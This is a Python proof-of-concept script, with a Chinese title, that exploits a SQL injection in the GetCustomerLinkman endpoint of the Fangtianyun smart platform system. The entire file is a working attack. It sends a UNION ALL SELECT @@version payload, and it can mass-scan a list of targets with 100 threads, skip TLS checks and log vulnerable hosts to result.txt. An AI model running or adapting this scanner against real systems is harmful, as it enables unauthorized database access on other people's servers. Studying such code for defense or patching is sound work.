#漏洞复现-方天云智慧平台系统 GetCustomerLinkman 存在SQL

import sys,requests,argparse,urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="方天云智慧平台系统 GetCustomerLinkman 存在SQL")

    parse.add_argument('-u','-url',dest='url',type=str,help="Please input -h")
    parse.add_argument('-f','-file',dest='file',type=str,help='Please input -h')

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url.strip())
    elif args.file and not args.url:
        lis = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for line in fp.readlines():
                lis.append(line.strip())
            mp = Pool(100)
            mp.map(poc,lis)
            mp.close
            mp.join
def poc(target):
    payload = "/WXAPI.asmx/GetCustomerLinkman"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json'
    }
    try:
        res1 = requests.post(url=target+payload,headers=headers,verify=False,timeout=5,json='{clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}')
        if  'Microsoft' in res1.text:
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')

    except Exception as e:
        pass

if __name__ == "__main__":
    main()